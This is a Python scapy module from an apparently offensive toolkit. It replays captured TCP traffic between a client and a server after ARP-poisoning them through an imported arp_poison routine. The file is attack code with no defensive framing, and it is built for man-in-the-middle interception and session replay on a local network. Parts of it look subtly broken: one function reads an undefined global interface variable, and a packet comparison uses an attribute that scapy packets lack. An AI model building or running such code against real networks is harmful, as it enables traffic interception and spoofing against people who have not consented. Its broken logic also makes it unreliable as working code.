import time
from scapy.all import *
from .Client import Client, NetAttrs
from .arp_poison import arp_poison


def replay_usage(exit_num=None):
    usg = ""
    usg += "Requires: Server/Client IP, PCAP Interface"

    print(usg)


def sniffer(src, dst):
    return sniff(iface=intface, count=1, lfilter=lambda x: x.haslayer(TCP) and
                 x[IP].src == dst.ip and x[IP].dst == src.ip)[0]


def rcv_valid(t, rcv):
    return t.ip == rcv.ip


def replay(client, src, dst, s_to_d, d_to_s):
    pos = 0
    while s_to_d:
        sendp(s_to_d.pop(0), iface=client.intface)
        if not rcv_valid(sniffer(src, dst), d_to_s.pop(0)):
            print('ERROR: unexpected recieve at position {}'.format(pos))
            return False
        pos += 1

    return True


# filter pcap for tcp messages from client and server
def pcap_filter(pcap, src, dst):
    s_to_d = []
    d_to_s = []

    for packet in pcap:
        if packet[IP].src == src.ip and packet[IP].dst == dst.ip:
            s_to_d.append(packet)

        elif packet[IP].src == dst.ip and packet[IP].dst == src.ip:
            d_to_s.append(packet)

    return (s_to_d, d_to_s)


def tcp_replay(client, src, dst):
    pcap = input('Enter pcap or show to see options: ')
    while 'show' == pcap:
        print(client)
        pcap = input('Enter pcap or show to see options: ')

    client.update(['pcap:', pcap])
    s_to_d, d_to_s = pcap_filter(client.pcaps[pcap], src, dst)

    arp_poison(client, src, dst)
    replay(client, src, dst, s_to_d, d_to_s)
